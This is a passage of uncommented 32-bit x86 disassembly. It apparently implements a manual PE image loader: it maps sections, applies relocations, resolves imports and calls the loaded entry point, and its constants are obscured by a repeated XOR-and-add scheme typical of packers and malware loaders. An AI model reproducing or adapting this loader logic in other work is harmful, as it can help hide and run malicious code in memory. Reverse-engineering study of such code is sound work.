  42701a:	mov    eax,DWORD PTR [edx+0x1c8]
  427020:	mov    DWORD PTR [eax],0xf89c85a2
  427026:	leave  
  427027:	ret    0x4
  42702a:	push   ebp
  42702b:	mov    ebp,esp
  42702d:	sub    esp,0x70
  427030:	and    DWORD PTR [ebp-0x20],0x0
  427034:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42703b:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  427042:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  427049:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  427050:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  427057:	mov    eax,DWORD PTR [ebp+0x20]
  42705a:	mov    eax,DWORD PTR [eax+0x194]
  427060:	mov    DWORD PTR [ebp-0xc],eax
  427063:	mov    eax,DWORD PTR [ebp+0x20]
  427066:	push   ebx
  427067:	push   esi
  427068:	mov    esi,DWORD PTR [eax+0x190]
  42706e:	mov    eax,DWORD PTR [ebp+0x20]
  427071:	mov    eax,DWORD PTR [eax+0x18c]
  427077:	mov    DWORD PTR [ebp-0x8],eax
  42707a:	mov    eax,DWORD PTR [eax]
  42707c:	push   edi
  42707d:	mov    DWORD PTR [ebp-0x4],esi
  427080:	test   eax,eax
  427082:	jne    0x42708f
  427084:	push   DWORD PTR [ebp+0x1c]
  427087:	mov    edx,DWORD PTR [ebp+0x20]
  42708a:	call   0x426fce
  42708f:	mov    eax,DWORD PTR [esi]
  427091:	mov    ebx,DWORD PTR [esi]
  427093:	add    ebx,DWORD PTR [eax+0x3c]
  427096:	mov    eax,DWORD PTR [ebp+0xc]
  427099:	mov    ecx,DWORD PTR [ebp-0x8]
  42709c:	mov    ecx,DWORD PTR [ecx]
  42709e:	mov    esi,0x75108ae
  4270a3:	xor    eax,esi
  4270a5:	mov    edi,0x3272f5
  4270aa:	add    eax,edi
  4270ac:	cmp    eax,ecx
  4270ae:	jne    0x4272e6
  4270b4:	mov    eax,DWORD PTR [ebp-0xc]
  4270b7:	mov    eax,DWORD PTR [eax]
  4270b9:	mov    DWORD PTR [ebp-0x10],eax
  4270bc:	mov    eax,DWORD PTR [ebx+0x50]
  4270bf:	mov    DWORD PTR [ebp-0x68],eax
  4270c2:	mov    eax,DWORD PTR [ebp-0x18]
  4270c5:	xor    eax,esi
  4270c7:	add    eax,edi
  4270c9:	mov    DWORD PTR [ebp-0x64],eax
  4270cc:	mov    eax,DWORD PTR [ebp-0x14]
  4270cf:	and    DWORD PTR [ebp-0x6c],0x0
  4270d3:	xor    eax,esi
  4270d5:	add    eax,edi
  4270d7:	mov    DWORD PTR [ebp-0x60],eax
  4270da:	lea    eax,[ebp-0x70]
  4270dd:	push   eax
  4270de:	mov    eax,DWORD PTR [ebp+0x8]
  4270e1:	xor    eax,esi
  4270e3:	add    eax,edi
  4270e5:	push   eax
  4270e6:	mov    eax,DWORD PTR [ebp+0x20]
  4270e9:	add    eax,0xaa
  4270ee:	push   eax
  4270ef:	mov    eax,DWORD PTR [ebp+0x20]
  4270f2:	mov    eax,DWORD PTR [eax+0x198]
  4270f8:	mov    DWORD PTR [ebp-0x70],0x4
  4270ff:	push   DWORD PTR [eax]
  427101:	mov    eax,DWORD PTR [ebp+0x10]
  427104:	call   eax
  427106:	mov    ecx,DWORD PTR [ebp-0xc]
  427109:	mov    ecx,DWORD PTR [ecx]
  42710b:	mov    edx,DWORD PTR [ebp-0x8]
  42710e:	mov    DWORD PTR [ebp-0x6c],eax
  427111:	mov    DWORD PTR [ebp+0x1c],eax
  427114:	mov    DWORD PTR [edx],ecx
  427116:	mov    ecx,DWORD PTR [ebp-0x4]
  427119:	mov    DWORD PTR [ecx],eax
  42711b:	mov    eax,DWORD PTR [ebx+0x50]
  42711e:	mov    DWORD PTR [ebp-0x68],eax
  427121:	mov    eax,DWORD PTR [ebp-0x1c]
  427124:	xor    eax,esi
  427126:	add    eax,edi
  427128:	mov    DWORD PTR [ebp-0x64],eax
  42712b:	lea    eax,[ebp-0x20]
  42712e:	mov    DWORD PTR [ebp-0x60],eax
  427131:	lea    eax,[ebp-0x70]
  427134:	push   eax
  427135:	mov    eax,DWORD PTR [ebp+0x8]
  427138:	xor    eax,esi
  42713a:	add    eax,edi
  42713c:	push   eax
  42713d:	mov    eax,DWORD PTR [ebp+0x20]
  427140:	add    eax,0xee
  427145:	push   eax
  427146:	mov    eax,DWORD PTR [ebp+0x20]
  427149:	mov    eax,DWORD PTR [eax+0x198]
  42714f:	mov    DWORD PTR [ebp-0x70],0x4
  427156:	push   DWORD PTR [eax]
  427158:	mov    eax,DWORD PTR [ebp+0x10]
  42715b:	call   eax
  42715d:	test   eax,eax
  42715f:	je     0x427184
  427161:	and    DWORD PTR [ebp+0xc],0x0
  427165:	cmp    DWORD PTR [ebx+0x50],0x0
  427169:	jbe    0x427184
  42716b:	mov    eax,DWORD PTR [ebp+0x1c]
  42716e:	mov    ecx,DWORD PTR [ebp-0x10]
  427171:	sub    ecx,eax
  427173:	mov    dl,BYTE PTR [ecx+eax*1]
  427176:	inc    DWORD PTR [ebp+0xc]
  427179:	mov    BYTE PTR [eax],dl
  42717b:	mov    edx,DWORD PTR [ebp+0xc]
  42717e:	inc    eax
  42717f:	cmp    edx,DWORD PTR [ebx+0x50]
  427182:	jb     0x427173
  427184:	mov    edx,DWORD PTR [ebp+0x1c]
  427187:	mov    ecx,DWORD PTR [edx+0x3c]
  42718a:	add    ecx,edx
  42718c:	mov    eax,DWORD PTR [ecx+0xa0]
  427192:	mov    ebx,DWORD PTR [ecx+0x28]
  427195:	add    eax,edx
  427197:	sub    edx,DWORD PTR [ebp-0x10]
  42719a:	add    ebx,DWORD PTR [ebp+0x1c]
  42719d:	mov    DWORD PTR [ebp+0xc],edx
  4271a0:	mov    DWORD PTR [ebp-0x2c],ecx
  4271a3:	mov    DWORD PTR [ebp-0x14],ebx
  4271a6:	mov    DWORD PTR [ebp-0x8],0x0
  4271ad:	jmp    0x427229
  4271af:	add    edx,0xfffffff8
  4271b2:	shr    edx,1
  4271b4:	mov    DWORD PTR [ebp-0x18],edx
  4271b7:	je     0x427215
  4271b9:	lea    edx,[eax+0x8]
  4271bc:	mov    DWORD PTR [ebp-0x4],edx
  4271bf:	mov    edx,DWORD PTR [ebp-0x18]
  4271c2:	mov    DWORD PTR [ebp-0x18],edx
  4271c5:	mov    edx,DWORD PTR [ebp-0x4]
  4271c8:	movzx  edx,WORD PTR [edx]
  4271cb:	mov    DWORD PTR [ebp-0x24],edx
  4271ce:	and    edx,0xfff
  4271d4:	mov    DWORD PTR [ebp-0x28],edx
  4271d7:	mov    edx,DWORD PTR [ebp-0x24]
  4271da:	shr    edx,0xc
  4271dd:	add    edx,0xffcd8d0b
  4271e3:	xor    edx,esi
  4271e5:	cmp    edx,0xf89c85a0
  4271eb:	jne    0x42720c
  4271ed:	mov    edx,DWORD PTR [ebp-0x28]
  4271f0:	add    edx,DWORD PTR [ebp+0x1c]
  4271f3:	mov    ebx,DWORD PTR [eax]
  4271f5:	cmp    DWORD PTR [ebx+edx*1],0x0
  4271f9:	je     0x427209
  4271fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4271fe:	add    ecx,DWORD PTR [ebx+edx*1]
  427201:	mov    ebx,DWORD PTR [eax]
  427203:	mov    DWORD PTR [edx+ebx*1],ecx
  427206:	mov    ecx,DWORD PTR [ebp-0x2c]
  427209:	mov    ebx,DWORD PTR [ebp-0x14]
  42720c:	add    DWORD PTR [ebp-0x4],0x2
  427210:	dec    DWORD PTR [ebp-0x18]
  427213:	jne    0x4271c5
  427215:	mov    edx,DWORD PTR [ebp-0xc]
  427218:	add    DWORD PTR [ebp-0x8],edx
  42721b:	mov    edx,DWORD PTR [ebp-0x8]
  42721e:	cmp    edx,DWORD PTR [ecx+0xa4]
  427224:	jae    0x427237
  427226:	add    eax,DWORD PTR [ebp-0xc]
  427229:	mov    edx,DWORD PTR [eax+0x4]
  42722c:	mov    DWORD PTR [ebp-0xc],edx
  42722f:	test   edx,edx
  427231:	jne    0x4271af
  427237:	mov    eax,DWORD PTR [ebp-0x10]
  42723a:	mov    DWORD PTR [ebp-0x6c],eax
  42723d:	mov    DWORD PTR [ebp-0x70],0x4
  427244:	mov    eax,DWORD PTR [ecx+0x50]
  427247:	mov    DWORD PTR [ebp-0x68],eax
  42724a:	mov    eax,DWORD PTR [ebp-0x1c]
  42724d:	xor    eax,esi
  42724f:	add    eax,edi
  427251:	mov    DWORD PTR [ebp-0x64],eax
  427254:	lea    eax,[ebp-0x20]
  427257:	mov    DWORD PTR [ebp-0x60],eax
  42725a:	lea    eax,[ebp-0x70]
  42725d:	push   eax
  42725e:	mov    eax,DWORD PTR [ebp+0x8]
  427261:	xor    eax,esi
  427263:	add    eax,edi
  427265:	push   eax
  427266:	mov    eax,DWORD PTR [ebp+0x20]
  427269:	add    eax,0xee
  42726e:	push   eax
  42726f:	mov    eax,DWORD PTR [ebp+0x20]
  427272:	mov    eax,DWORD PTR [eax+0x198]
  427278:	push   DWORD PTR [eax]
  42727a:	mov    eax,DWORD PTR [ebp+0x10]
  42727d:	call   eax
  42727f:	mov    eax,DWORD PTR [ebp+0x20]
  427282:	mov    eax,DWORD PTR [eax+0x180]
  427288:	add    eax,DWORD PTR [ebp+0xc]
  42728b:	mov    ecx,DWORD PTR [ebp+0xc]
  42728e:	push   DWORD PTR [ebp+0x18]
  427291:	mov    DWORD PTR [eax],ecx
  427293:	push   DWORD PTR [ebp+0x14]
  427296:	push   DWORD PTR [ebp+0x1c]
  427299:	call   ebx
  42729b:	mov    ecx,DWORD PTR [ebp+0xc]
  42729e:	add    ecx,DWORD PTR [ebp+0x20]
  4272a1:	lea    eax,[ebp+0x4]
  4272a4:	mov    DWORD PTR [ebp+0x20],ecx
  4272a7:	mov    ecx,DWORD PTR [ebp+0x20]
  4272aa:	mov    ecx,DWORD PTR [ebp+0x20]
  4272ad:	mov    edx,DWORD PTR [ecx+0x190]
  4272b3:	mov    ecx,DWORD PTR [ebp+0x20]
  4272b6:	mov    ecx,DWORD PTR [ecx+0x18c]
  4272bc:	mov    esi,DWORD PTR [ecx]
  4272be:	cmp    DWORD PTR [eax],esi
  4272c0:	jb     0x4272e1
  4272c2:	mov    esi,DWORD PTR [edx]
  4272c4:	mov    edi,DWORD PTR [edx]
  4272c6:	mov    esi,DWORD PTR [esi+0x3c]
  4272c9:	lea    esi,[edi+esi*1+0x50]
  4272cd:	mov    edi,DWORD PTR [ecx]
  4272cf:	add    edi,DWORD PTR [esi]
  4272d1:	cmp    DWORD PTR [eax],edi
  4272d3:	jae    0x4272e1
  4272d5:	mov    esi,DWORD PTR [ecx]
  4272d7:	mov    ecx,DWORD PTR [eax]
  4272d9:	mov    edx,DWORD PTR [edx]
  4272db:	sub    ecx,esi
  4272dd:	add    edx,ecx
  4272df:	mov    DWORD PTR [eax],edx
  4272e1:	mov    eax,DWORD PTR [ebp+0xc]
  4272e4:	jmp    0x4272e8
  4272e6:	xor    eax,eax
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    0x1c
  4272ef:	push   ebp
  4272f0:	mov    ebp,esp
  4272f2:	sub    esp,0x1c
  4272f5:	push   esi
  4272f6:	mov    esi,eax
  4272f8:	mov    eax,DWORD PTR [ecx+0x190]
  4272fe:	cmp    DWORD PTR [eax],0x0
  427301:	je     0x427411
  427307:	test   edx,edx
  427309:	je     0x427411
  42730f:	test   esi,esi
  427311:	je     0x427411
  427317:	mov    eax,DWORD PTR [esi+0x88]
  42731d:	test   eax,eax
  42731f:	je     0x42740c
  427325:	cmp    DWORD PTR [esi+0x8c],0x10
  42732c:	je     0x42740c
  427332:	cmp    DWORD PTR [esi+0x34],edx
  427335:	je     0x42740c
  42733b:	mov    esi,DWORD PTR [ecx+0x18c]
  427341:	and    DWORD PTR [ebp-0x10],0x0
  427345:	mov    ecx,edx
  427347:	sub    ecx,DWORD PTR [esi]
  427349:	add    eax,edx
  42734b:	movzx  edx,WORD PTR [eax+0xc]
  42734f:	mov    DWORD PTR [ebp-0x1c],ecx
  427352:	movzx  ecx,WORD PTR [eax+0xe]
  427356:	add    ecx,edx
  427358:	je     0x42740c
  42735e:	lea    ecx,[eax+0x14]
  427361:	push   ebx
  427362:	mov    DWORD PTR [ebp-0x18],ecx
  427365:	mov    esi,0x7fffffff
  42736a:	push   edi
  42736b:	test   DWORD PTR [ecx],esi
  42736d:	je     0x4273ee
  42736f:	mov    edx,DWORD PTR [ecx]
  427371:	and    DWORD PTR [ebp-0xc],0x0
  427375:	and    edx,esi
  427377:	add    edx,eax
  427379:	movzx  edi,WORD PTR [edx+0xe]
  42737d:	movzx  ebx,WORD PTR [edx+0xc]
  427381:	add    edi,ebx
  427383:	je     0x4273ee
  427385:	lea    ecx,[edx+0x14]
  427388:	mov    DWORD PTR [ebp-0x14],ecx
  42738b:	test   DWORD PTR [ecx],esi
  42738d:	je     0x4273d0
  42738f:	mov    ecx,DWORD PTR [ecx]
  427391:	and    DWORD PTR [ebp-0x8],0x0
  427395:	and    ecx,esi
  427397:	add    ecx,eax
  427399:	movzx  edi,WORD PTR [ecx+0xe]
  42739d:	movzx  ebx,WORD PTR [ecx+0xc]
  4273a1:	add    edi,ebx
  4273a3:	je     0x4273d0
  4273a5:	lea    edi,[ecx+0x14]
  4273a8:	mov    DWORD PTR [ebp-0x4],edi
  4273ab:	mov    edi,DWORD PTR [ebp-0x4]
  4273ae:	mov    edi,DWORD PTR [edi]
  4273b0:	test   edi,edi
  4273b2:	je     0x4273ba
  4273b4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4273b7:	add    DWORD PTR [edi+eax*1],ebx
  4273ba:	movzx  edi,WORD PTR [ecx+0xe]
  4273be:	movzx  ebx,WORD PTR [ecx+0xc]
  4273c2:	inc    DWORD PTR [ebp-0x8]
  4273c5:	add    DWORD PTR [ebp-0x4],0x8
  4273c9:	add    edi,ebx
  4273cb:	cmp    DWORD PTR [ebp-0x8],edi
  4273ce:	jb     0x4273ab
  4273d0:	movzx  edi,WORD PTR [edx+0xe]
  4273d4:	movzx  ebx,WORD PTR [edx+0xc]
  4273d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4273db:	inc    DWORD PTR [ebp-0xc]
  4273de:	add    ecx,0x8
  4273e1:	add    edi,ebx
  4273e3:	mov    DWORD PTR [ebp-0x14],ecx
  4273e6:	cmp    DWORD PTR [ebp-0xc],edi
  4273e9:	jb     0x42738b
  4273eb:	mov    ecx,DWORD PTR [ebp-0x18]
  4273ee:	movzx  edx,WORD PTR [eax+0xe]
  4273f2:	movzx  edi,WORD PTR [eax+0xc]
  4273f6:	inc    DWORD PTR [ebp-0x10]
  4273f9:	add    ecx,0x8
  4273fc:	add    edx,edi
  4273fe:	mov    DWORD PTR [ebp-0x18],ecx
  427401:	cmp    DWORD PTR [ebp-0x10],edx
  427404:	jb     0x42736b
  42740a:	pop    edi
  42740b:	pop    ebx
  42740c:	xor    eax,eax
  42740e:	inc    eax
  42740f:	jmp    0x427413
  427411:	xor    eax,eax
  427413:	pop    esi
  427414:	leave  
  427415:	ret    
  427416:	push   ebp
  427417:	mov    ebp,esp
  427419:	mov    ecx,DWORD PTR [ecx+0x190]
  42741f:	mov    eax,DWORD PTR [ebp+0xc]
  427422:	sub    esp,0x10
  427425:	push   ebx
  427426:	xor    ebx,ebx
  427428:	push   esi
  427429:	push   edi
  42742a:	cmp    DWORD PTR [ecx],ebx
  42742c:	je     0x4274b4
  427432:	cmp    eax,ebx
  427434:	je     0x4274b4
  427436:	cmp    DWORD PTR [eax+0x78],ebx
  427439:	jne    0x427440
  42743b:	xor    eax,eax
  42743d:	inc    eax
  42743e:	jmp    0x4274b6
  427440:	mov    eax,DWORD PTR [eax+0x78]
  427443:	add    eax,DWORD PTR [ebp+0x8]
  427446:	mov    ecx,DWORD PTR [eax+0x1c]
  427449:	mov    edx,DWORD PTR [eax+0x24]
  42744c:	mov    esi,DWORD PTR [eax+0x14]
  42744f:	mov    edi,DWORD PTR [eax+0x18]
  427452:	add    ecx,DWORD PTR [ebp+0x8]
  427455:	add    edx,DWORD PTR [ebp+0x8]
  427458:	mov    DWORD PTR [ebp-0x4],esi
  42745b:	cmp    esi,edi
  42745d:	ja     0x427462
  42745f:	mov    DWORD PTR [ebp-0x4],edi
  427462:	mov    DWORD PTR [ebp-0x8],ebx
  427465:	cmp    DWORD PTR [ebp-0x4],ebx
  427468:	jbe    0x42743b
  42746a:	cmp    ebx,DWORD PTR [eax+0x14]
  42746d:	jae    0x427475
  42746f:	movzx  esi,WORD PTR [edx+ebx*2]
  427473:	jmp    0x427477
  427475:	mov    esi,ebx
  427477:	lea    esi,[ecx+esi*4]
  42747a:	mov    edi,DWORD PTR [esi]
  42747c:	test   edi,edi
  42747e:	je     0x4274a9
  427480:	add    edi,DWORD PTR [ebp+0x8]
  427483:	mov    DWORD PTR [ebp-0x10],edi
  427486:	cmp    edi,eax
  427488:	jbe    0x42749a
  42748a:	mov    ebx,DWORD PTR [ebp+0xc]
  42748d:	mov    ebx,DWORD PTR [ebx+0x7c]
  427490:	add    ebx,eax
  427492:	cmp    edi,ebx
  427494:	jae    0x42749a
  427496:	mov    esi,DWORD PTR [esi]
  427498:	jmp    0x4274a2
  42749a:	sub    edi,DWORD PTR [ebp+0x8]
  42749d:	mov    DWORD PTR [esi],edi
  42749f:	mov    esi,DWORD PTR [ebp-0x10]
  4274a2:	test   esi,esi
  4274a4:	je     0x4274b4
  4274a6:	mov    ebx,DWORD PTR [ebp-0x8]
  4274a9:	inc    ebx
  4274aa:	mov    DWORD PTR [ebp-0x8],ebx
  4274ad:	cmp    ebx,DWORD PTR [ebp-0x4]
  4274b0:	jb     0x42746a
  4274b2:	jmp    0x42743b
  4274b4:	xor    eax,eax
  4274b6:	pop    edi
  4274b7:	pop    esi
  4274b8:	pop    ebx
  4274b9:	leave  
  4274ba:	ret    0x8
  4274bd:	push   ebp
  4274be:	mov    ebp,esp
  4274c0:	sub    esp,0x2c
  4274c3:	mov    edx,0xf89c85a5
  4274c8:	mov    DWORD PTR [ebp-0x4],edx
  4274cb:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4274d2:	mov    eax,DWORD PTR [ebp-0x4]
  4274d5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4274db:	mov    ecx,DWORD PTR [ebp-0x4]
  4274de:	mov    ecx,DWORD PTR [ebp-0x4]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4274e4:	push   ebx
  4274e5:	mov    ebx,DWORD PTR [ebp+0x10]
  4274e8:	push   esi
  4274e9:	mov    esi,0x75108ae
  4274ee:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  4274f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274f8:	mov    ebx,DWORD PTR [ebx+0x190]
  4274fe:	push   edi
  4274ff:	mov    edi,0x3272f5
  427504:	xor    ecx,esi
  427506:	xor    eax,esi
  427508:	add    eax,edi
  42750a:	add    ecx,edi
  42750c:	mov    DWORD PTR [ebp-0x18],eax
  42750f:	cmp    ecx,DWORD PTR [ebx]
  427511:	je     0x427792
  427517:	mov    ebx,DWORD PTR [ebp-0x4]
  42751a:	mov    ecx,DWORD PTR [ebp+0xc]
  42751d:	xor    ebx,esi
  42751f:	add    ebx,edi
  427521:	cmp    ebx,ecx
  427523:	je     0x427792
  427529:	mov    ebx,DWORD PTR [ebp-0x4]
  42752c:	mov    ecx,DWORD PTR [ecx+0x80]
  427532:	xor    ebx,esi
  427534:	add    ebx,edi
  427536:	cmp    ecx,ebx
  427538:	je     0x42778d
  42753e:	add    ecx,DWORD PTR [ebp+0x8]
  427541:	mov    DWORD PTR [ebp-0x2c],ecx
  427544:	mov    ebx,edx
  427546:	xor    ebx,esi
  427548:	add    ebx,edi
  42754a:	mov    DWORD PTR [ebp-0x10],ebx
  42754d:	mov    ebx,DWORD PTR [ebp-0x10]
  427550:	cmp    ebx,edx
  427552:	je     0x427566
  427554:	mov    edx,DWORD PTR [ebp-0x10]
  427557:	mov    ebx,DWORD PTR [ebp-0x4]
  42755a:	imul   edx,edx,0x14
  42755d:	xor    ebx,esi
  42755f:	add    ebx,edi
  427561:	cmp    DWORD PTR [edx+ecx*1],ebx
  427564:	jne    0x42757d
  427566:	mov    edx,DWORD PTR [ebp-0x10]
  427569:	mov    ebx,DWORD PTR [ebp-0x4]
  42756c:	imul   edx,edx,0x14
  42756f:	xor    ebx,esi
  427571:	add    ebx,edi
  427573:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  427577:	je     0x42777f
  42757d:	mov    eax,DWORD PTR [ebp-0x4]
  427580:	mov    ebx,DWORD PTR [ebp-0x4]
  427583:	mov    eax,DWORD PTR [ebp-0x10]
  427586:	imul   eax,eax,0x14
  427589:	add    eax,ecx
  42758b:	mov    ecx,DWORD PTR [eax+0x10]
  42758e:	add    ecx,DWORD PTR [ebp+0x8]
  427591:	xor    ebx,esi
  427593:	mov    DWORD PTR [ebp-0x1c],ecx
  427596:	mov    ecx,DWORD PTR [ebp-0x4]
  427599:	mov    edx,DWORD PTR [ebp-0x4]
  42759c:	xor    ecx,esi
  42759e:	add    ecx,edi
  4275a0:	xor    edx,esi
  4275a2:	mov    DWORD PTR [ebp-0x24],ecx
  4275a5:	mov    ecx,DWORD PTR [eax]
  4275a7:	add    edx,edi
  4275a9:	add    ebx,edi
  4275ab:	cmp    ecx,edx
  4275ad:	je     0x4275b5
  4275af:	add    ecx,DWORD PTR [ebp+0x8]
  4275b2:	mov    DWORD PTR [ebp-0x24],ecx
  4275b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4275b8:	xor    ecx,esi
  4275ba:	add    ecx,DWORD PTR [eax+0xc]
  4275bd:	mov    eax,DWORD PTR [ebp+0x8]
  4275c0:	lea    eax,[ecx+eax*1+0x3272f5]
  4275c7:	mov    DWORD PTR [ebp+0xc],eax
  4275ca:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4275d1:	mov    eax,DWORD PTR [ebp+0x10]
  4275d4:	push   DWORD PTR [ebp+0xc]
  4275d7:	mov    eax,DWORD PTR [eax+0x1e0]
  4275dd:	call   DWORD PTR [eax]
  4275df:	mov    ecx,DWORD PTR [ebp-0x4]
  4275e2:	xor    ecx,esi
  4275e4:	add    ecx,edi
  4275e6:	mov    DWORD PTR [ebp-0xc],eax
  4275e9:	cmp    ecx,eax
  4275eb:	jne    0x4275ff
  4275ed:	mov    eax,DWORD PTR [ebp+0x10]
  4275f0:	push   DWORD PTR [ebp+0xc]
  4275f3:	mov    eax,DWORD PTR [eax+0x1e0]
  4275f9:	call   DWORD PTR [eax+0xc]
  4275fc:	mov    DWORD PTR [ebp-0xc],eax
  4275ff:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  427606:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  42760d:	mov    eax,DWORD PTR [ebp-0x4]
  427610:	xor    eax,esi
  427612:	add    eax,edi
  427614:	cmp    eax,DWORD PTR [ebp-0xc]
  427617:	jne    0x42763c
  427619:	mov    eax,DWORD PTR [ebp-0x8]
  42761c:	mov    ecx,DWORD PTR [ebp-0x20]
  42761f:	xor    eax,esi
  427621:	xor    ecx,esi
  427623:	lea    ebx,[ebx+eax*1+0x3272f5]
  42762a:	mov    eax,DWORD PTR [ebp+0x10]
  42762d:	mov    eax,DWORD PTR [eax+0x1e0]
  427633:	add    ecx,edi
  427635:	imul   ecx,ebx
  427638:	push   ecx
  427639:	call   DWORD PTR [eax+0x24]
  42763c:	mov    eax,DWORD PTR [ebp-0x4]
  42763f:	xor    eax,esi
  427641:	add    eax,edi
  427643:	cmp    eax,DWORD PTR [ebp-0xc]
  427646:	jne    0x427657
  427648:	mov    eax,DWORD PTR [ebp-0x28]
  42764b:	xor    eax,esi
  42764d:	add    eax,edi
  42764f:	cmp    ebx,eax
  427651:	jbe    0x4275d1
  427657:	mov    eax,DWORD PTR [ebp-0x4]
  42765a:	xor    eax,esi
  42765c:	add    eax,edi
  42765e:	cmp    eax,DWORD PTR [ebp-0xc]
  427661:	jne    0x42767a
  427663:	mov    eax,DWORD PTR [ebp-0x8]
  427666:	mov    ecx,DWORD PTR [ebp-0x18]
  427669:	xor    eax,esi
  42766b:	lea    eax,[ecx+eax*1+0x3272f5]
  427672:	mov    DWORD PTR [ebp-0x18],eax
  427675:	jmp    0x427769
  42767a:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427681:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  427688:	mov    ebx,DWORD PTR [ebp-0x4]
  42768b:	xor    ebx,esi
  42768d:	add    ebx,edi
  42768f:	jmp    0x427756
  427694:	mov    eax,DWORD PTR [ebp-0x4]
  427697:	xor    eax,esi
  427699:	add    eax,edi
  42769b:	mov    DWORD PTR [ebp-0x14],eax
  42769e:	mov    eax,DWORD PTR [ebp-0x4]
  4276a1:	xor    eax,esi
  4276a3:	add    eax,edi
  4276a5:	mov    DWORD PTR [ebp+0xc],eax
  4276a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4276ab:	mov    eax,DWORD PTR [ebp-0x24]
  4276ae:	xor    ecx,esi
  4276b0:	add    ecx,edi
  4276b2:	cmp    ecx,eax
  4276b4:	je     0x4276bc
  4276b6:	mov    eax,DWORD PTR [eax+ebx*4]
  4276b9:	mov    DWORD PTR [ebp-0x14],eax
  4276bc:	mov    eax,DWORD PTR [ebp-0x1c]
  4276bf:	mov    eax,DWORD PTR [eax+ebx*4]
  4276c2:	mov    DWORD PTR [ebp+0xc],eax
  4276c5:	mov    eax,DWORD PTR [ebp-0x4]
  4276c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4276cb:	xor    eax,esi
  4276cd:	add    eax,edi
  4276cf:	cmp    eax,ecx
  4276d1:	je     0x4276fc
  4276d3:	mov    eax,DWORD PTR [ebp-0x4]
  4276d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4276d9:	xor    eax,esi
  4276db:	add    eax,edi
  4276dd:	shr    ecx,0x1f
  4276e0:	cmp    eax,ecx
  4276e2:	je     0x4276fc
  4276e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4276e7:	mov    eax,DWORD PTR [ebp+0x10]
  4276ea:	mov    eax,DWORD PTR [eax+0x1e0]
  4276f0:	movzx  ecx,cx
  4276f3:	push   ecx
  4276f4:	push   DWORD PTR [ebp-0xc]
  4276f7:	call   DWORD PTR [eax+0x8]
  4276fa:	jmp    0x427715
  4276fc:	mov    eax,DWORD PTR [ebp+0xc]
  4276ff:	add    eax,DWORD PTR [ebp+0x8]
  427702:	mov    ecx,DWORD PTR [ebp+0x10]
  427705:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42770b:	add    eax,0x2
  42770e:	push   eax
  42770f:	push   DWORD PTR [ebp-0xc]
  427712:	call   DWORD PTR [ecx+0x8]
  427715:	mov    DWORD PTR [ebp+0xc],eax
  427718:	mov    eax,DWORD PTR [ebp-0x4]
  42771b:	mov    ecx,DWORD PTR [ebp+0xc]
  42771e:	xor    eax,esi
  427720:	add    eax,edi
  427722:	cmp    eax,ecx
  427724:	mov    eax,DWORD PTR [ebp-0x8]
  427727:	jne    0x42773a
  427729:	mov    ecx,DWORD PTR [ebp-0x18]
  42772c:	xor    eax,esi
  42772e:	lea    eax,[ecx+eax*1+0x3272f5]
  427735:	mov    DWORD PTR [ebp-0x18],eax
  427738:	jmp    0x42774a
  42773a:	mov    ecx,DWORD PTR [ebp+0xc]
  42773d:	xor    eax,esi
  42773f:	add    eax,edi
  427741:	imul   eax,ecx
  427744:	mov    ecx,DWORD PTR [ebp-0x1c]
  427747:	mov    DWORD PTR [ecx+ebx*4],eax
  42774a:	mov    eax,DWORD PTR [ebp-0x8]
  42774d:	xor    eax,esi
  42774f:	lea    ebx,[ebx+eax*1+0x3272f5]
  427756:	mov    eax,DWORD PTR [ebp-0x4]
  427759:	mov    ecx,DWORD PTR [ebp-0x1c]
  42775c:	xor    eax,esi
  42775e:	add    eax,edi
  427760:	cmp    DWORD PTR [ecx+ebx*4],eax
  427763:	jne    0x427694
  427769:	mov    edx,DWORD PTR [ebp-0x10]
  42776c:	mov    eax,DWORD PTR [ebp-0x18]
  42776f:	mov    ecx,DWORD PTR [ebp-0x2c]
  427772:	sub    edx,0x3272f4
  427778:	xor    edx,esi
  42777a:	jmp    0x427544
  42777f:	mov    ecx,DWORD PTR [ebp-0x4]
  427782:	xor    ecx,esi
  427784:	add    ecx,edi
  427786:	cmp    eax,ecx
  427788:	mov    eax,DWORD PTR [ebp-0x4]
  42778b:	jne    0x427795
  42778d:	mov    eax,DWORD PTR [ebp-0x8]
  427790:	jmp    0x427795
  427792:	mov    eax,DWORD PTR [ebp-0x4]
  427795:	xor    eax,esi
  427797:	add    eax,edi
  427799:	pop    edi
  42779a:	pop    esi
  42779b:	pop    ebx
  42779c:	leave  
  42779d:	ret    0xc
  4277a0:	push   ebp
  4277a1:	mov    ebp,esp
  4277a3:	sub    esp,0x28
  4277a6:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4277ad:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  4277b4:	mov    eax,DWORD PTR [ebp+0xc]
  4277b7:	mov    DWORD PTR [ebp+0xc],eax
  4277ba:	push   esi
  4277bb:	mov    eax,eax
  4277bd:	mov    eax,DWORD PTR [ebp-0x4]
  4277c0:	mov    esi,DWORD PTR [ebp+0x8]
  4277c3:	mov    ecx,0x75108ae
  4277c8:	xor    eax,ecx
  4277ca:	mov    edx,0x3272f5
  4277cf:	add    eax,edx
